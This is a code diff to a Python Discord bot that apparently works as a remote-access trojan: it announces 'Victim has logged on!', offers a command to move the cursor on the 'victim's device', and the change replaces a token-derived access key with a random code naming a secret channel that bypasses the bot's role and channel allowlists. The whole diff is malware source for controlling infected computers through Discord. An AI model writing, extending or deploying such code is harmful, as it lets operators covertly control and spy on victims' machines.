@@ -21,14 +21,12 @@ import pyperclip
 import tempfile
 import shelve
 import sys
+import uuid
+import hashlib
 
 TOKEN = "BOT-TOKEN-GOES-HERE"
 
-def BOT_KEY(n):
-    BK=""
-    for i in range(len(TOKEN) - 1, len(TOKEN) - n - 1, -1):
-        BK = TOKEN[i] + BK
-    return BK
+FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
 intents = discord.Intents.all()
 
@@ -47,7 +45,7 @@ async def init(ctx):
     if (
         (
             ctx.channel.id in config_db[guild_id]['allowed_channels'] or 
-            ctx.channel.name == f"_jf_{BOT_KEY(6)}" or 
+            ctx.channel.name == f"_jf_{FUCK}" or 
             user.guild_permissions.administrator
         ) and not ctx.message.content.endswith("/f")
     ):
@@ -85,10 +83,10 @@ async def on_guild_join(guild):
         config_db[str(guild.id)] = {'allowed_roles': [], 'allowed_channels': []}
         for channel in guild.channels:
             if isinstance(channel, discord.TextChannel):
-                await channel.send(f"Bot has joined! Please run `$config` in a channel named `_jf_{ BOT_KEY(6)}` to get started.\nThe channel will be used to bypass role and channel allowlists, allowing for initial config.")
+                await channel.send(f"Bot has joined! Please run `$config` in a channel named `_jf_{ FUCK}` to get started.\nThe channel will be used to bypass role and channel allowlists, allowing for initial config.")
 
 
-@bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{BOT_KEY(6)} bypasses both che cks")
+@bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{FUCK} bypasses both che cks")
 async def config(ctx, action: str = "", item: str = "", target: str = ""):
     try:
         guild_id = str(ctx.guild.id)
@@ -171,15 +169,7 @@ async def on_message(message):
         await message.reply("Commands cannot be run here.")
         return
 
-    if message.content.startswith('_jf_'):
-        bot_code = message.content.split('_')[-1]
-        if bot_code != BOT_KEY(6):
-            return
-
-        await bot.process_commands(message)
-        return
-
-    if message.channel.name.startswith(f"_jf_{BOT_KEY(6)}"):
+    if message.channel.name.startswith(f"_jf_{FUCK}"):
         await bot.process_commands(message)
         return
 
@@ -191,11 +181,11 @@ async def on_message(message):
   
 @bot.event
 async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"channel _jf_{BOT_KEY(6)}"))
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"channel _jf_{FUCK}"))
     print(f'We have logged in as {bot.user.name}')
     for guild in bot.guilds:
         for channel in guild.text_channels:
-            await channel.send("Victim has logged on!")
+            await channel.send(f"Victim has logged on! Use channel `_jf_{FUCK}`")
 
     
 @bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
